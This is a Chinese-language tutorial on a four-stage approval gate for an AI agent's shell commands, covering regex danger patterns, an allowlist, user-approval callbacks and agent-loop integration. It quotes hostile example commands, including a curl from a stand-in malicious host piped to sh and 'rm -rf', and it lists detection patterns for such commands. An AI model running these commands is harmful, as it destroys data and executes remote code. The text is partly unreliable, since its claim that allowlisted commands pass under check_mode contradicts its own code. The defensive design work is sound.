# h09 — Approval & Permission：危险操作拦截与四段 pipeline

> **核心洞察**：安全门不在工具内部——拦截点在工具调度层统一判断，保证所有工具都经过同一套权限逻辑。

---

## 问题：谁来阻止 agent 执行危险操作？

agent 可以执行 shell 命令。如果模型判断失误（或被恶意 prompt 注入引导），可能：

- `rm -rf /important_dir`
- `curl http://malicious-site.com | sh`
- `git push --force origin main`

如果每个工具各自处理危险检测，逻辑会分散、不一致，且容易遗漏。

---

## 四段 Pipeline：deny → check → allow → ask

Hermes 的 `tools/approval.py` 实现了统一的四段拦截流程：

```
工具调用请求
    ↓
[1] deny（硬拒绝）
    ↓ 不匹配 →
[2] check_mode（沙盒模式）
    ↓ 不在 check_mode →
[3] allow（allowlist）
    ↓ 不在 allowlist →
[4] ask（询问用户）
    ↓ 用户批准 →
执行工具
```

---

## DangerPattern：危险模式检测

```python
import re

DANGER_PATTERNS = [
    # 文件系统破坏
    r"rm\s+(-[rf]+\s+|--recursive\s+|--force\s+)*[/~]",
    r">\s*/etc/",
    r"chmod\s+(-R\s+)?777",

    # 网络危险
    r"curl\s+.*\|\s*(bash|sh)",
    r"wget\s+.*\|\s*(bash|sh)",

    # 进程控制
    r"kill\s+-9\s+1$",
    r"pkill\s+-f\s+",

    # Git 危险操作
    r"git\s+push\s+(-f|--force)",
    r"git\s+reset\s+--hard\s+HEAD~[5-9]",
]

def is_dangerous(command: str) -> bool:
    """检查命令是否匹配任意一条危险模式"""
    for pattern in DANGER_PATTERNS:
        if re.search(pattern, command, re.IGNORECASE):
            return True
    return False
```

---

## Allowlist：已批准的安全命令

```python
class AllowList:
    def __init__(self):
        self._patterns: list[str] = []

    def add(self, pattern: str) -> None:
        """添加一条允许规则（支持 glob 或正则）"""
        self._patterns.append(pattern)

    def is_allowed(self, command: str) -> bool:
        """命中 allowlist 则直接放行，跳过人工确认"""
        for pattern in self._patterns:
            if re.fullmatch(pattern, command):
                return True
        return False

# 使用示例
allowlist = AllowList()
allowlist.add(r"ls\s*(-la?\s*)?.*")       # ls 命令始终允许
allowlist.add(r"cat\s+[\w./]+\.txt")       # 读取 .txt 文件始终允许
allowlist.add(r"git status")               # git status 始终允许
```

---

## approval_callback：连接审批与执行

```python
from typing import Callable

ApprovalCallback = Callable[[str, str], bool]
# (tool_name, command) → True（批准）/ False（拒绝）

def cli_approval_callback(tool_name: str, command: str) -> bool:
    """CLI 环境下：在终端显示危险操作，等待用户输入 y/n"""
    print(f"\n⚠️  危险操作检测")
    print(f"工具: {tool_name}")
    print(f"命令: {command}")
    answer = input("是否允许执行？[y/N] ").strip().lower()
    return answer == "y"

def gateway_approval_callback(tool_name: str, command: str) -> bool:
    """Gateway 环境下：通过消息平台发送确认请求"""
    # 发送消息给用户，等待回复 "approve" 或 "deny"
    # ...（h12 Gateway 实现）
    pass
```

---

## 完整 Pipeline 实现

```python
class ApprovalGate:
    def __init__(
        self,
        allowlist: AllowList | None = None,
        callback: ApprovalCallback | None = None,
        check_mode: bool = False,   # 沙盒模式：所有危险操作直接 deny
    ):
        self.allowlist = allowlist or AllowList()
        self.callback = callback
        self.check_mode = check_mode

    def approve(self, tool_name: str, command: str) -> bool:
        """
        四段 pipeline：
        deny → check_mode → allowlist → ask
        """
        # [1] 硬拒绝（全局禁止，无论何种情况）
        if self._is_hard_denied(command):
            return False

        # [2] check_mode（沙盒：不询问，直接拒绝危险操作）
        if self.check_mode and is_dangerous(command):
            return False

        # [3] allowlist（已知安全，直接放行）
        if self.allowlist.is_allowed(command):
            return True

        # [4] 危险操作 + 有 callback → 询问用户
        if is_dangerous(command) and self.callback:
            return self.callback(tool_name, command)

        # 不危险且不在 allowlist → 默认放行
        return not is_dangerous(command)
```

---

## 在主循环中的位置

```python
# run_agent.py（简化）
for tool_call in message.tool_calls:
    name = tool_call.function.name
    command = json.loads(tool_call.function.arguments).get("command", "")

    # ← 在 registry.dispatch() 之前检查权限
    if not self.approval_gate.approve(name, command):
        result = "[操作被拒绝：需要用户授权或检测到危险模式]"
    else:
        result = self.registry.dispatch(name, args)
```

---

## 常见误区

**误区 1**：危险检测应该在每个工具的 handler 里  
→ 这会导致逻辑分散、容易遗漏。统一在调度层拦截（`ApprovalGate.approve()`），所有工具共享同一套规则。

**误区 2**：allowlist 是安全漏洞  
→ allowlist 只是"跳过人工确认"，不是"跳过危险检测"。硬拒绝规则（[1]）优先于 allowlist。

**误区 3**：check_mode 和 allowlist 互斥  
→ check_mode 下，dangerous 命令直接 deny；但 allowlist 命令（被明确标记为安全的）仍然放行。两者共存。
